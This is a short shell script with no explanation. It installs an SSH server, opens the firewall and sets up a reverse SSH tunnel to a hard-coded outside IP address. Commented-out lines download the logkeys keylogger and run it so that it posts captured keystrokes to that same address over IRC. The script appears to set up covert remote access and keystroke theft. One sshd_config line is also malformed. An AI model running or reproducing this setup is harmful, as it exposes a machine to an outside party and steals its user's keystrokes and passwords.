sudo apt update
sudo apt install openssh-server -y
sudo ufw allow ssh
sudo /etc/ssh/sshd_config << "GatewayPorts yes"
systemctl reload ssh.service

ssh -R 22:127.0.0.1:2222 gizmo@75.138.184.49
#wget http://launchpadlibrarian.net/165012984/logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
#sudo apt install logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
#logkeys -s --post-size=1K --post-irc 75.138.184.49:27580
